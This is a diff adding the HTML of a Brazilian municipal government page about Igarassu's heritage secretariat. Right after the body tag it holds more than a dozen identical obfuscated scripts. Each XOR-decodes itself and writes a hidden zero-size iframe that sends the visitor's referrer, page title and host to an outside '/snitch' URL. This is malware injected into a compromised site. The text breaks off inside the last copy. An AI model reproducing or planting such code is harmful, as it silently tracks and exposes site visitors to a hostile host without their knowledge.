@@ -1,0 +1,485 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR">
+<!-- Codigo por CodaCSS (http://codacss.com.br) - Powered by WordPress (http://wordpress.org) -->
+
+<!--BEGIN head-->
+<head profile="http://gmpg.org/xfn/11">
+
+	<title>Secretaria de Patrimônio Histórico &raquo; Prefeitura Municipal de Igarassu</title>
+
+	<!-- Meta Tags -->
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="generator" content="WordPress" />
+	<meta name="framework" content="WP-CodaCSS" />
+	<meta name="developer" content="CodaCSS (http://codacss.com.br)" />
+
+	<!-- Favicon: Browser + iPhone -->
+	<link rel="shortcut icon" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/images/favicon.ico" />
+	<link rel="apple-touch-icon" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/images/iphone.png" />
+
+	<!-- Folhas de Estilos -->
+	<link rel="stylesheet" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/style.css" type="text/css" media="screen, projection" />
+	<link rel="stylesheet" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/css/print.css" type="text/css" media="print" />
+
+  	<!-- Links: RSS + Atom Syndication + Pingback etc. -->
+	<link rel="alternate" type="application/rss+xml" title="Prefeitura Municipal de Igarassu RSS Feed" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/feed/" />
+	<link rel="alternate" type="text/xml" title="RSS .92" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/feed/rss/" />
+	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/feed/atom/" />
+	<link rel="pingback" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/xmlrpc.php" />
+
+	<!-- WP Header -->
+    	<link rel="alternate" type="application/rss+xml" title="Prefeitura Municipal de Igarassu &raquo; Secretaria de Patrimônio Histórico  Feed de comentários" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-patrimonio-historico/feed/" />
+<link rel='stylesheet' id='contact-form-7-css'  href='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=3.7.2' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-includes/js/jquery/jquery.js?ver=1.11.0'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/supersubs.js?ver=3.9.26'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/jquery.bgiframe.min.js?ver=3.9.26'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/superfish.js?ver=3.9.26'></script>
+<script type='text/javascript' src='http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/screen.js?ver=3.9.26'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Secretaria de Comércio e Serviços' href='http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-comercio-e-servicos/' />
+<link rel='next' title='ADEMIG' href='http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/orgaos/ademig/' />
+
+<link rel='canonical' href='http://www.mobic.com.br/clientes/prefeitura-igarassu/index.php/secretarias-e-orgaos/secretarias/secretaria-de-patrimonio-historico/' />
+<link rel='shortlink' href='http://www.mobic.com.br/clientes/prefeitura-igarassu/?p=311' />
+<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/plugins/audio-player/assets/audio-player.js?ver=2.0.4.6"></script>
+<script type="text/javascript">AudioPlayer.setup("http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/plugins/audio-player/assets/player.swf?ver=2.0.4.6", {width:"290",animation:"yes",encode:"yes",initialvolume:"60",remaining:"no",noinfo:"no",buffer:"5",checkpolicy:"no",rtl:"no",bg:"E5E5E5",text:"333333",leftbg:"EEEEEE",lefticon:"333333",volslider:"666666",voltrack:"FFFFFF",rightbg:"B4B4B4",rightbghover:"999999",righticon:"333333",righticonhover:"FFFFFF",track:"FFFFFF",loader:"9FFFB8",border:"CCCCCC",tracker:"DDDDDD",skip:"666666",pagebg:"FFFFFF",transparentpagebg:"yes"});</script>
+	<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+    
+	<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.1/jquery.min.js"></script>
+	<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/jquery.cycle.all.min.js"></script>
+	<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/jquery.caroufredsel.js"></script>
+	<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/twitter.js"></script>
+	<script type="text/javascript" src="http://www.mobic.com.br/clientes/prefeitura-igarassu/wp-content/themes/igarassu/library/media/js/fancybox/jquery.fancybox.pack.js"></script>
+
+</head>
+<body class="singular y2019 m02 d23 h20 page pageid-311 page-author-admin page-child parent-pageid-118 page-template page-template-tpl-secretaria-e-orgaos-interna-php windows msie">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00a33l6,'00'02)'02'00k,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c